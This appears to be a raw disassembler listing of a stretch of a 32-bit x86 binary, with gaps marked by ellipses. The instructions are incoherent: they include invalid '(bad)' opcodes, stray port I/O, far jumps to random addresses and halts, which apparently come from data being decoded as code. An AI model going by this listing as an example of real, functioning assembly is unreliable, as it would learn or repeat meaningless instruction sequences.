  425376:	xchg   ebp,eax
  425377:	retf   
  425378:	push   ds
  425379:	es inc ebx
  42537b:	outs   dx,DWORD PTR ds:[esi]
  42537c:	cdq    
  42537d:	sub    BYTE PTR [esi],bh
  42537f:	rol    BYTE PTR [edi-0x1d],0x28
  425383:	sbb    ah,bh
  425385:	cdq    
  425386:	jbe    0x4253a5
  425388:	jl     0x4253c3
  42538a:	in     eax,dx
  42538b:	pop    ss
  42538c:	push   0xf6f62125
  425391:	fist   WORD PTR [edi+eiz*2+0x7a]
  425395:	mov    esi,0x695cac96
  42539a:	push   ecx
  42539b:	fs inc edx
  42539d:	inc    ecx
  42539e:	jb     0x4253a8
  4253a0:	push   cs
  4253a1:	daa    
  4253a2:	jge    0x4253cb
  4253a4:	push   0x963ac227
  4253a9:	sti    
  4253aa:	pop    ds
  4253ab:	dec    eax
  4253ac:	sub    BYTE PTR [esi-0x6f],al
  4253af:	push   eax
  4253b0:	out    0x7b,eax
  4253b2:	dec    ecx
  4253b3:	sub    esp,esp
	...
  425415:	add    BYTE PTR [edx+0x9],al
  425418:	les    ebp,FWORD PTR [ecx-0x14901231]
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	xchg   edx,eax
  425423:	inc    esi
  425424:	push   0xffffffee
  425426:	cld    
  425427:	mov    WORD PTR [ecx],es
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [edx+eiz*4],ch
  425430:	fidivr DWORD PTR [ebp+esi*8+0x50bb4038]
  425437:	ss ret 
  425439:	jg     0x4253bc
  42543b:	dec    dh
  42543d:	inc    ebx
  42543e:	push   ss
  42543f:	sbb    ah,bl
  425441:	fadd   QWORD PTR [ecx-0x44]
  425444:	mov    esp,0x8035dad8
  425449:	(bad)  
  42544b:	stos   DWORD PTR es:[edi],eax
  42544c:	jbe    0x4254c9
  42544e:	ss push eax
  425450:	vmptrst QWORD PTR [esi+0x2c]
  425454:	xchg   ecx,eax
  425455:	shl    esp,0xe7
  425458:	pop    ds
  425459:	mov    ds:0x80cda717,eax
  42545e:	jmp    0xe64e7b16
  425463:	push   es
  425464:	mov    ds,WORD PTR [esi-0x182be23]
  42546a:	pushf  
  42546b:	hlt    
  42546c:	std    
  42546d:	adc    edi,DWORD PTR [ebx+eiz*1-0x6b]
  425471:	fisub  DWORD PTR [edi-0x2c]
  425474:	rcl    eax,0x55
  425477:	dec    eax
  425478:	dec    esi
  425479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42547a:	scas   eax,DWORD PTR es:[edi]
  42547b:	test   DWORD PTR [edi],ecx
  42547d:	test   eax,0xe9388d9e
  425482:	pop    DWORD PTR [edx+0xd]
  425485:	enter  0x9f66,0x4f
  425489:	add    DWORD PTR [edi],ecx
  42548b:	mov    WORD PTR [eax+0x6d],fs
  42548e:	cwde   
  42548f:	xor    BYTE PTR [edx],al
  425491:	repz and DWORD PTR [edx],esp
  425494:	and    BYTE PTR [ecx],dl
  425496:	(bad)  
  425497:	fist   DWORD PTR [ecx]
  425499:	sbb    eax,0xae764465
  42549e:	fisub  DWORD PTR [ebx-0x2af171ed]
  4254a4:	push   edi
  4254a5:	int    0xb0
  4254a7:	aas    
  4254a8:	mov    ?,WORD PTR [edx]
  4254aa:	scas   al,BYTE PTR es:[edi]
  4254ab:	ror    DWORD PTR [edi+0x5c],1
  4254ae:	cmp    eax,0xb5940fce
  4254b3:	(bad)  
  4254b4:	push   edi
  4254b5:	inc    esi
  4254b6:	hlt    
  4254b7:	inc    ebx
  4254b8:	jne    0x4254ef
  4254ba:	dec    esi
  4254bb:	and    DWORD PTR [edi+ebx*8-0x6be399eb],esi
  4254c2:	xchg   ebx,eax
  4254c3:	push   esi
  4254c4:	mov    dh,0x85
  4254c6:	lods   eax,DWORD PTR ds:[esi]
  4254c7:	leave  
  4254c8:	and    ecx,DWORD PTR [esi]
  4254ca:	clc    
  4254cb:	adc    al,0x9f
  4254cd:	retf   
  4254ce:	xchg   edi,eax
  4254cf:	xchg   edi,esp
  4254d1:	cmp    BYTE PTR [ebx+0x1bcdec0],0x2
  4254d8:	(bad)  
  4254d9:	out    dx,eax
  4254da:	push   0xffffffec
  4254dc:	in     al,0x1c
  4254de:	ret    
  4254df:	ficomp DWORD PTR [edi+0x2a339967]
  4254e5:	test   al,0xdd
  4254e7:	sbb    DWORD PTR [edi-0x7efe5fa6],ebx
  4254ed:	sahf   
  4254ee:	ret    
  4254ef:	xor    eax,0x585e10b3
  4254f4:	mov    bh,0xac
  4254f6:	popa   
  4254f7:	iret   
  4254f8:	iret   
  4254f9:	dec    esp
  4254fa:	popf   
  4254fb:	and    DWORD PTR gs:[eax-0x4a],ecx
  4254ff:	pop    eax
  425500:	and    BYTE PTR [esp+ebx*1-0x52],0xeb
  425505:	fsubr  DWORD PTR [esi+0x24aee34d]
  42550b:	pop    esp
  42550c:	fcom   QWORD PTR [edi+0x77]
  42550f:	pushf  
  425510:	push   esp
  425511:	push   ebp
  425512:	dec    eax
  425513:	aas    
  425514:	jecxz  0x425574
  425516:	jno    0x425517
  425518:	test   al,0x7
  42551a:	sbb    al,ah
  42551c:	mov    al,ds:0x8140bef8
  425521:	inc    ebx
  425522:	dec    ebp
  425523:	dec    esp
  425524:	cmp    al,0xc0
  425526:	aaa    
  425527:	fcom   QWORD PTR [ebp-0x6ecd0464]
  42552d:	adc    al,0xf2
  42552f:	popf   
  425530:	test   eax,0xa9af9a2d
	...
  425595:	add    ah,al
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0x68c6
  4255a3:	dec    edi
  4255a4:	gs call 0x107:0x18e03
  4255ac:	add    BYTE PTR [eax],al
  4255ae:	xchg   edi,eax
  4255af:	addr16 add eax,0x6010be9
  4255b5:	sub    al,0x4
  4255b7:	fdiv   QWORD PTR [edx-0xb]
  4255ba:	inc    ecx
  4255bb:	xchg   ebp,eax
  4255bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255bd:	add    DWORD PTR [eax-0x2c7a95fd],esp
  4255c3:	cdq    
  4255c4:	shr    DWORD PTR [edi-0x27],cl
  4255c7:	and    ebp,eax
  4255c9:	adc    BYTE PTR [esi],bl
  4255cb:	hlt    
  4255cc:	sbb    eax,0x3d89dbed
  4255d1:	add    eax,0xb9c9869a
  4255d6:	mov    fs,WORD PTR [esp+edx*1-0x37]
  4255da:	and    eax,0xa3eae0a9
  4255df:	fwait
  4255e0:	(bad)  
  4255e1:	and    eax,0xf89f827d
  4255e6:	in     eax,0x49
  4255e8:	xor    edx,ecx
  4255ea:	adc    al,0xb
  4255ec:	or     DWORD PTR [ebx+eiz*8-0x5c],edi
  4255f0:	ret    0x5f82
  4255f3:	(bad)  
  4255f4:	leave  
  4255f5:	cli    
  4255f6:	scas   eax,DWORD PTR es:[edi]
  4255f7:	mov    bh,0x21
  4255f9:	adc    eax,DWORD PTR [eax-0x11]
  4255fc:	pop    es
  4255fd:	sub    esi,ebp
  4255ff:	and    al,0xc0
  425601:	hlt    
  425602:	mov    bl,0xde
  425604:	fimul  DWORD PTR [ebp-0x7bd78925]
  42560a:	inc    esi
  42560b:	inc    ebx
  42560c:	outs   dx,BYTE PTR ds:[esi]
  42560d:	mov    eax,ds:0xd6275439
  425612:	sub    ch,BYTE PTR [ebx]
  425614:	pop    ecx
  425615:	pop    edi
  425616:	dec    ebx
  425617:	cmp    eax,0x5f3314d9
  42561c:	mov    esp,ebp
  42561e:	xchg   ebp,eax
  42561f:	jg     0x425652
  425621:	les    esp,FWORD PTR [ebx-0x10]
  425624:	(bad)  
  425625:	ins    BYTE PTR es:[edi],dx
  425626:	cmp    DWORD PTR [ecx+edi*8-0x50],ebp
  42562a:	stc    
  42562b:	push   ebx
  42562c:	mov    al,0x70
  42562e:	and    esi,ecx
  425630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425631:	fsub   QWORD PTR [ecx-0x22]
  425634:	inc    eax
  425635:	jmp    0xb887:0x5ec351cc
  42563c:	pop    DWORD PTR [edi+0x50]
  42563f:	data16 jo 0x4255ca
  425642:	out    0xb4,al
  425644:	daa    
  425645:	add    esp,ecx
  425647:	scas   al,BYTE PTR es:[edi]
  425648:	mov    esi,0x8e36e228
  42564d:	ficomp DWORD PTR [edx+edx*8+0x29dde53f]
  425654:	sub    ebx,ecx
  425656:	inc    esp
  425657:	pop    eax
  425658:	jnp    0x4255e2
  42565a:	pop    es
  42565b:	stos   BYTE PTR es:[edi],al
  42565c:	gs add al,0x22
  42565f:	sahf   
  425660:	jns    0x4255e6
  425662:	jb     0x4255e8
  425664:	cmp    edx,ebx
  425666:	mov    bh,0xa9
  425668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425669:	xor    al,0xd4
  42566b:	out    dx,eax
  42566c:	retf   
  42566d:	pop    eax
  42566e:	aaa    
  42566f:	fisttp QWORD PTR [edx+0x55adf942]
  425675:	int3   
  425676:	loopne 0x4256e4
  425678:	push   ebp
  425679:	(bad)  
  42567a:	gs pop ebx
  42567c:	add    DWORD PTR [edx-0x651a6e2a],esp
  425682:	push   edi
  425683:	cmp    ebx,DWORD PTR [ebx-0x36]
  425686:	test   DWORD PTR [edi+0x6b],0xafefc1d7
  42568d:	popf   
  42568e:	dec    eax
  42568f:	dec    edx
  425690:	or     dh,BYTE PTR [esi]
  425692:	(bad)  [ecx-0x66]
  425695:	mov    ebx,DWORD PTR [ebx+0x1a]
  425698:	inc    ecx
  425699:	pop    es
  42569a:	in     eax,dx
  42569b:	mov    ch,0xf7
  42569d:	push   ss
  42569e:	outs   dx,DWORD PTR ds:[esi]
  42569f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256a0:	pop    ss
  4256a1:	scas   eax,DWORD PTR es:[edi]
  4256a2:	(bad)  
  4256a3:	bound  eax,QWORD PTR [eax+eax*2]
  4256a6:	mov    al,0x83
  4256a8:	sbb    esi,DWORD PTR [esi+0x7fdac916]
  4256ae:	dec    ebx
  4256af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256b0:	fmul   DWORD PTR ds:0xe77aa
	...
  425716:	(bad)  
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx+0x31e64015],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	(bad)  
  42572f:	out    dx,al
  425730:	mov    esi,0xbd33705b
  425735:	add    eax,0x2dfdaaa3
  42573a:	inc    esp
  42573b:	je     0x42572c
  42573d:	jmp    FWORD PTR [eax]
  42573f:	or     ebp,DWORD PTR [ecx+0x60]
  425742:	jnp    0x425795
  425744:	xchg   esp,eax
  425745:	and    DWORD PTR [eax+esi*8],ebx
  425748:	fsubr  QWORD PTR ds:0x1585c2d9
  42574e:	sti    
  42574f:	loopne 0x4257ae
  425751:	pusha  
  425752:	daa    
  425753:	imul   ebx,DWORD PTR [ecx+0x30],0xc77437f
  42575a:	lahf   
  42575b:	js     0x42573c
  42575d:	sbb    BYTE PTR [esi-0x54c5c16a],dh
  425763:	mov    ds:0xd7066b06,eax
  425768:	neg    DWORD PTR [ebp-0x71]
  42576b:	fmul   DWORD PTR [ebx+0x2b]
  42576e:	push   esi
  42576f:	push   eax
  425770:	mov    BYTE PTR [ebx+0x666f7c05],cl
  425776:	xor    eax,0xd55a5093
  42577b:	jne    0x42575c
  42577d:	test   eax,0xbbd5b639
  425782:	stos   BYTE PTR es:[edi],al
  425783:	hlt    
  425784:	(bad)  [edi+0x49]
  425787:	inc    ebp
  425788:	pushf  
  425789:	cwde   
  42578a:	stc    
  42578b:	pop    ebp
  42578c:	repz inc ebx
  42578e:	and    edx,edx
  425790:	sub    DWORD PTR [edi+0x1fdeba86],esi
  425796:	out    dx,al
  425797:	loopne 0x4257d3
  425799:	add    bh,BYTE PTR [ebx-0x34013afd]
  42579f:	xchg   esp,eax
  4257a0:	push   edx
  4257a1:	sbb    ah,BYTE PTR [edx]
  4257a3:	sbb    al,0x63
  4257a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257a6:	mov    al,ds:0x42f2c027
  4257ab:	inc    ebx
  4257ad:	inc    esi
  4257ae:	sub    DWORD PTR [ebx],ebx
  4257b0:	and    bl,bh
  4257b2:	in     eax,0xf8
  4257b4:	cs sar dh,0x46
  4257b8:	lds    ebx,FWORD PTR [edi]
  4257ba:	xor    eax,0xd64a23f9
  4257bf:	cmp    ebp,DWORD PTR [edi-0x53]
  4257c2:	not    BYTE PTR [edi+edi*2]
  4257c5:	sbb    DWORD PTR [eax+0x64],edi
  4257c8:	pop    edx
  4257c9:	nop
  4257ca:	pop    ecx
  4257cb:	ficom  WORD PTR [ecx]
  4257cd:	repz cwde 
  4257cf:	ror    DWORD PTR [eax+0x7fd80da3],0x28
  4257d6:	gs aam 0x3f
  4257d9:	and    eax,0x102154e1
  4257de:	mov    eax,ds:0x6730bd23
  4257e3:	cmc    
  4257e4:	stos   DWORD PTR es:[edi],eax
  4257e5:	ror    DWORD PTR [esi],cl
  4257e7:	sbb    edx,DWORD PTR [eax]
  4257e9:	cwde   
  4257ea:	cmp    BYTE PTR [edi-0x7cb22319],ch
  4257f0:	ficomp DWORD PTR [ebp+esi*1+0x4eaa52bc]
  4257f7:	dec    eax
  4257f8:	pcmpeqd mm5,QWORD PTR [eax-0xebaa625]
  4257ff:	add    DWORD PTR [ecx+0x4a],ecx
  425802:	sbb    DWORD PTR [esi-0x34],edx
  425805:	mov    edi,0x80a14ffd
  42580a:	out    dx,eax
  42580b:	mov    BYTE PTR [ecx],al
  42580d:	nop
  42580e:	lock popf 
  425810:	add    ebp,ebp
  425812:	cmp    BYTE PTR [ebx],0x61
  425815:	lods   al,BYTE PTR ds:[esi]
  425816:	in     al,dx
  425817:	lock adc BYTE PTR [eax+0x6302243e],0x9
  42581f:	not    DWORD PTR [ebx]
  425821:	aaa    
  425822:	jbe    0x4257f7
  425824:	push   esp
  425825:	mov    bh,0x70
  425827:	jp     0x42584b
  425829:	das    
  42582a:	push   es
  42582b:	out    dx,eax
  42582c:	aaa    
  42582d:	lahf   
  42582e:	shr    BYTE PTR [ebx-0x6423c41b],cl
  425834:	xchg   ecx,eax
	...
  425895:	add    BYTE PTR [edx+edx*2-0x70],bl
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0xe2d4aa66,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	pop    es
  4258af:	retf   
  4258b0:	mov    ecx,0xdcfb6ec
  4258b5:	push   edx
  4258b6:	jmp    0x89d3:0xdd6ae559
  4258bd:	xchg   dh,bl
  4258bf:	pop    es
  4258c0:	cli    
  4258c1:	mov    dl,0xda
  4258c3:	mov    cl,0xc3
  4258c5:	int    0x9e
  4258c7:	mov    al,ds:0xbb69ab9c
  4258cc:	in     eax,0x21
  4258ce:	out    0x73,eax
  4258d0:	mov    ah,0x59
  4258d2:	fidiv  WORD PTR [eax-0x61]
  4258d5:	fistp  WORD PTR [ebx]
  4258d7:	loop   0x425881
  4258d9:	xor    al,0xc7
  4258db:	mov    bh,0xdd
  4258dd:	or     dl,BYTE PTR [esi-0x5b]
  4258e0:	sbb    al,0x8e
  4258e2:	lds    eax,FWORD PTR [edi]
  4258e4:	fwait
  4258e5:	nop
  4258e6:	cld    
  4258e7:	jmp    0x53b0:0xa25dc5b3
  4258ee:	call   0x88548c40
  4258f3:	fiadd  DWORD PTR [eax-0x29c2cd89]
  4258f9:	inc    edi
  4258fa:	(bad)  [edi-0x45]
  4258fd:	fnstsw WORD PTR [edi+0x58]
  425900:	repnz les ebp,FWORD PTR [ebx+0x133043b2]
  425907:	fnstcw WORD PTR [edi-0x39543256]
  42590d:	dec    ebp
  42590e:	dec    esi
  42590f:	dec    edi
  425910:	ins    DWORD PTR es:[edi],dx
  425911:	test   al,dl
  425913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425914:	hlt    
  425915:	sub    ecx,0xffffff82
  425918:	push   ss
  425919:	and    eax,0x7c8a8b5d
  42591e:	xor    esp,DWORD PTR [eax]
  425920:	jle    0x42599c
  425922:	int3   
  425923:	push   edi
  425924:	add    al,0x42
  425926:	stos   DWORD PTR es:[edi],eax
  425927:	inc    edi
  425928:	xor    esp,DWORD PTR [ebx-0xf]
  42592b:	in     al,dx
  42592c:	jae    0x425975
  42592e:	pusha  
  42592f:	mov    ds:0x803e23f9,eax
  425934:	jbe    0x42598f
  425936:	xor    bl,BYTE PTR [ebx]
  425938:	(bad)  
  425939:	cmp    DWORD PTR [esi+edx*1-0x48],edx
  42593d:	xlat   BYTE PTR ds:[ebx]
  42593e:	push   esi
  42593f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425940:	sbb    DWORD PTR [edi-0x2b],eax
  425943:	(bad)  
  425944:	lds    edx,FWORD PTR [eax+0x1e]
  425947:	shl    DWORD PTR [eax],1
  425949:	sar    eax,1
  42594b:	adc    dh,BYTE PTR [esi+0x46]
  42594e:	std    
  42594f:	or     al,0xee
  425951:	cmp    al,bh
  425953:	and    al,BYTE PTR [ebx-0x15af1fd7]
  425959:	fsubr  DWORD PTR [edx+0x3ffe39c]
  42595f:	shl    DWORD PTR [ebp-0x5f],1
  425962:	lock add DWORD PTR [ebp+ecx*2+0x21f8f2bd],ebp
  42596a:	aaa    
  42596b:	push   eax
  42596c:	cmp    dl,bh
  42596e:	xor    ch,BYTE PTR [ebx+0x11]
  425971:	pushf  
  425972:	dec    esp
  425973:	js     0x42595e
  425975:	jno    0x425995
  425977:	rcr    DWORD PTR cs:[eax],1
  42597a:	daa    
  42597b:	or     DWORD PTR [ebp+0x4b2f073b],esi
  425981:	and    BYTE PTR [ebp+eiz*4-0x83e2ed9],al
  425988:	xchg   ebp,eax
  425989:	adc    ebp,esi
  42598b:	lds    eax,FWORD PTR [esi+0x2dd55c55]
  425991:	aaa    
  425992:	sub    BYTE PTR [ecx+ebp*8],0x88
  425996:	sar    DWORD PTR [esi-0x684c156c],cl
  42599c:	push   ebp
  42599d:	scas   eax,DWORD PTR es:[edi]
  42599e:	push   ecx
  42599f:	cmp    eax,0x42b7fa18
  4259a4:	xlat   BYTE PTR ds:[ebx]
  4259a5:	push   0x58
  4259a7:	ins    DWORD PTR es:[edi],dx
  4259a8:	jle    0x425944
  4259aa:	and    DWORD PTR [edx-0x2b53f942],edi
  4259b0:	aaa    
  4259b1:	stos   DWORD PTR es:[edi],eax
  4259b2:	ficomp WORD PTR [edi]
  4259b4:	jmp    0x4259b9
	...
  425a15:	add    cl,al
  425a17:	arpl   WORD PTR [edi+eiz*2],ax
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x5a4ffe11
  425a24:	sub    eax,0x1911834
  425a29:	add    BYTE PTR [edi],al
  425a2b:	add    DWORD PTR [eax],eax
  425a2d:	add    BYTE PTR [ebp+0x33da99f3],dl
  425a33:	popf   
  425a34:	shl    DWORD PTR [eax],cl
  425a36:	jno    0x425a49
  425a38:	mov    al,ds:0x2707915e
  425a3d:	cld    
  425a3e:	jb     0x4259e7
  425a40:	or     BYTE PTR [ebp+ecx*4+0xe1552d0],ah
  425a47:	inc    DWORD PTR [edx+0x75]
  425a4a:	or     al,BYTE PTR [ecx+0x7e]
  425a4d:	add    eax,0x2bfa16b2
  425a52:	icebp  
  425a53:	imul   ecx,DWORD PTR [eax+0x74],0x3112fb23
  425a5a:	aad    0x27
  425a5c:	inc    edx
  425a5d:	cli    
  425a5e:	jmp    0x699d01ac
  425a63:	mov    dl,0x93
  425a65:	call   0x139693be
  425a6a:	das    
  425a6b:	jmp    0x425a18
  425a6d:	or     ecx,DWORD PTR [eax]
  425a6f:	dec    esp
  425a70:	xor    al,0x2c
  425a72:	or     ch,BYTE PTR [edi+ebx*2-0x7f763813]
  425a79:	add    ah,cl
  425a7b:	xor    ch,ch
  425a7d:	inc    esi
  425a7e:	inc    esp
  425a7f:	stos   BYTE PTR es:[edi],al
  425a80:	and    al,0x88
  425a83:	jmp    0xac0f:0x40ba02ec
  425a8a:	fst    st(4)
  425a8c:	and    al,0xe9
  425a8e:	jecxz  0x425a76
  425a90:	js     0x425a41
  425a92:	adc    al,0x68
  425a94:	lahf   
  425a95:	imul   ebp,DWORD PTR [ebx-0x61],0xffffff82
  425a99:	pop    eax
  425a9a:	mov    ecx,0xfb1624bd
  425a9f:	sub    BYTE PTR [ecx+0x6ca5561d],dl
  425aa5:	stos   DWORD PTR es:[edi],eax
  425aa6:	and    eax,0xfc4431d8
  425aab:	(bad)  
  425aac:	jp     0x425a89
  425aae:	clc    
  425aaf:	sub    al,0x51
  425ab1:	adc    DWORD PTR [edx-0x29],edx
  425ab4:	mov    ds:0x788ab582,al
  425ab9:	scas   al,BYTE PTR es:[edi]
  425aba:	mov    eax,ds:0x39dbe420
  425abf:	retf   0x20eb
  425ac2:	ror    DWORD PTR [eax+eax*2+0x75096607],1
  425ac9:	dec    ebx
  425aca:	lahf   
  425acb:	pop    ebp
  425acc:	aas    
  425acd:	js     0x425afc
  425acf:	xchg   al,cl
  425ad1:	scas   al,BYTE PTR es:[edi]
  425ad2:	dec    ebp
  425ad3:	mov    ecx,0x239d7787
  425ad8:	push   eax
  425ad9:	scas   al,BYTE PTR es:[edi]
  425ada:	ret    
  425adb:	sbb    esi,DWORD PTR [edx+0x45]
  425ade:	sbb    bh,BYTE PTR [ebp+0x6d371fcb]
  425ae4:	call   0xc138:0x2be3dbda
  425aeb:	xchg   ecx,eax
  425aec:	int3   
  425aed:	bound  eax,QWORD PTR [edi]
  425aef:	jns    0x425b31
  425af1:	call   0xe2fd8fb8
  425af6:	cmp    eax,0xdc6c3c71
  425afb:	cmp    al,0x36
  425afd:	out    dx,al
  425afe:	pop    ss
  425aff:	dec    esp
  425b00:	fs std 
  425b02:	sub    esp,ebp
  425b04:	cmp    ah,dh
  425b06:	dec    ecx
  425b07:	push   ecx
  425b08:	mov    ds:0x99244f2a,al
  425b0d:	test   al,0x41
  425b0f:	cmp    dh,ch
  425b11:	das    
  425b12:	sub    BYTE PTR [ebp+0x1b5065ed],cl
  425b18:	pop    ebp
  425b19:	loope  0x425aa8
  425b1b:	shl    DWORD PTR [ecx],0xf3
  425b1e:	or     BYTE PTR [edi],dl
  425b20:	sbb    BYTE PTR [edx+0x0],dl
  425b23:	xchg   BYTE PTR [eax+0x43],ch
  425b26:	or     BYTE PTR [ebp+0x13245c06],0x9f
  425b2d:	dec    DWORD PTR [ecx-0xc91c72b]
  425b33:	ins    DWORD PTR es:[edi],dx
  425b34:	push   edx
	...
  425b95:	add    ah,al
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0xf9a5aad3
  425ba3:	int    0x12
  425ba5:	dec    ebp
  425ba6:	pop    ds
  425ba7:	xchg   edx,eax
  425ba8:	add    DWORD PTR [eax],eax
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [edx+0x207298fa],ah
  425bb3:	in     eax,dx
  425bb4:	pop    edi
  425bb5:	out    dx,eax
  425bb6:	neg    DWORD PTR [edx]
  425bb8:	outs   dx,DWORD PTR ds:[esi]
  425bb9:	test   BYTE PTR [esi+0xd6a8845],dl
  425bbf:	jg     0x425b78
  425bc1:	jne    0x425bcb
  425bc3:	mov    esi,0x61960b9
  425bc8:	imul   ecx,DWORD PTR [esi+eiz*1],0x16
  425bcc:	shl    BYTE PTR [edx+ebp*8+0x37f49f9f],cl
  425bd3:	add    ebx,0x37dca1af
  425bd9:	sub    eax,0x2d5b5820
  425bde:	pop    es
  425bdf:	cdq    
  425be0:	bnd call 0xea320da0
  425be6:	inc    esi
  425be7:	dec    edi
  425be8:	lahf   
  425be9:	or     cl,BYTE PTR [esi+0x48]
  425bec:	lock mov eax,ds:0x66d474af
  425bf2:	or     ah,BYTE PTR ds:0x68991214
  425bf8:	inc    bl
  425bfa:	push   edi
  425bfb:	mov    fs,WORD PTR [eax]
  425bfd:	into   
  425bfe:	mov    esi,0xdc0dfdec
  425c03:	sub    ebp,DWORD PTR [edi+0x26053a5]
  425c09:	dec    esp
  425c0a:	lea    esp,[esi]
  425c0c:	pop    ebx
  425c0d:	aam    0x23
  425c0f:	add    BYTE PTR [ebx+0x3c],cl
  425c12:	push   esi
  425c13:	cwde   
  425c14:	mov    esp,0x69dced91
  425c19:	clc    
  425c1a:	sub    DWORD PTR [edi],esi
  425c1c:	hlt    
  425c1d:	out    dx,al
  425c1e:	imul   eax,DWORD PTR [ecx*8-0x16f927d5],0xd80fc680
  425c29:	xor    al,0x2e
  425c2b:	ror    BYTE PTR [eax+0x7230842d],1
  425c31:	cmp    al,0xd4
  425c33:	xor    DWORD PTR [eax-0x6a270be1],eax
  425c39:	jecxz  0x425bc6
  425c3b:	or     ch,BYTE PTR ds:0x71f065f3
  425c41:	mov    ebx,0x8f496c89
  425c46:	xchg   ebx,eax
  425c47:	das    
  425c48:	in     al,0x35
  425c4a:	inc    esp
  425c4b:	das    
  425c4c:	xchg   ecx,eax
  425c4d:	fisubr WORD PTR [eax]
  425c4f:	and    DWORD PTR [ebx],esp
  425c51:	out    0x34,al
  425c53:	sbb    edi,edx
  425c55:	jge    0x425cd0
  425c57:	repz ss lock ret 0xc486
  425c5d:	jno    0x425cca
  425c5f:	push   cs
  425c60:	daa    
  425c61:	ss pushw ds
  425c64:	popf   
  425c65:	clc    
  425c66:	and    al,0x7f
  425c68:	daa    
  425c69:	addr16 dec esi
  425c6b:	adc    ah,BYTE PTR [ebx+ebp*2-0x54d7486f]
  425c72:	lds    esp,FWORD PTR [edx-0x372574c2]
  425c78:	popf   
  425c79:	pop    ebx
  425c7a:	pop    esp
  425c7b:	aad    0x6f
  425c7d:	rcr    ebx,1
  425c7f:	pop    ds
  425c80:	pop    eax
  425c81:	mov    bl,al
  425c83:	xor    al,0x9c
  425c85:	mov    dh,0x83
  425c87:	mov    ecx,eax
  425c89:	xor    BYTE PTR [ebx+0x45],bh
  425c8c:	mov    ds:0xdef003b5,al
  425c91:	pop    ds
  425c92:	js     0x425c80
  425c94:	cmp    edx,DWORD PTR [eax+edi*1]
  425c97:	mov    bl,0x4e
  425c99:	push   ss
  425c9a:	jne    0x425c61
  425c9c:	adc    ebp,DWORD PTR [ebp+0x14809630]
  425ca2:	int3   
  425ca3:	inc    edi
  425ca4:	fadd   DWORD PTR [ebx]
  425ca6:	push   es
  425ca7:	int    0xb2
  425ca9:	clc    
  425caa:	jecxz  0x425c4c
  425cac:	xchg   edi,eax
  425cad:	hlt    
  425cae:	pop    ebp
  425caf:	ret    
  425cb0:	sub    bl,BYTE PTR [esi+0xb2695c]
	...
  425d16:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0x87
  425d23:	les    ebp,FWORD PTR [eax-0x6a]
  425d26:	es xchg ebx,eax
  425d28:	add    DWORD PTR [eax],eax
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    dl,ah
  425d2f:	js     0x425ce7
  425d31:	gs cdq 
  425d33:	pusha  
  425d34:	jecxz  0x425d69
  425d36:	sub    eax,0x755ec99f
  425d3b:	cwde   
  425d3c:	inc    edx
  425d3d:	push   0xffffffae
  425d3f:	ds ror ebp,0xdb
  425d43:	inc    ecx
  425d44:	cmp    BYTE PTR [edx+0x4b1b22ae],bl
  425d4a:	mov    edi,0xd7b08da1
  425d4f:	jno    0x425cdb
  425d51:	sahf   
  425d52:	lock lea ebx,[ebx]
  425d55:	push   edi
  425d56:	fisub  DWORD PTR [eax]
  425d58:	push   0x57958598
  425d5d:	pop    ecx
  425d5e:	stc    
  425d5f:	and    DWORD PTR [ecx-0x4b7f9363],esi
  425d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d66:	pushf  
  425d67:	sub    BYTE PTR [edi-0x3b],dl
  425d6a:	leave  
  425d6b:	xor    eax,0x86c396f2
  425d70:	gs pop ds
  425d72:	pop    edx
  425d73:	hlt    
  425d74:	out    dx,eax
  425d75:	stc    
  425d76:	mov    ch,0xdb
  425d78:	out    0x90,al
  425d7a:	stos   DWORD PTR es:[edi],eax
  425d7b:	ror    BYTE PTR [edx-0x10],0x6
  425d7f:	enter  0x7cdb,0xc5
  425d83:	push   edx
  425d84:	mov    al,0xd1
  425d86:	nop
  425d87:	int    0x18
  425d89:	aaa    
  425d8a:	pushf  
  425d8b:	xchg   DWORD PTR [ecx-0x654e0782],esp
  425d91:	and    eax,0x9d44d996
  425d96:	loopne 0x425dfa
  425d98:	mov    ebx,0xde4060c7
  425d9d:	dec    ebx
  425d9e:	mov    edx,0x152d15b8
  425da3:	mov    es,WORD PTR ds:0xe60c11fd
  425da9:	mov    dl,0xe4
  425dab:	cmp    al,0xff
  425dad:	xchg   ecx,eax
  425dae:	sbb    al,0xdf
  425db0:	stc    
  425db1:	mov    dl,0x25
  425db3:	and    BYTE PTR [ecx-0x1b5e03ae],bh
  425db9:	popf   
  425dba:	and    BYTE PTR [ebp-0x7c340df8],dl
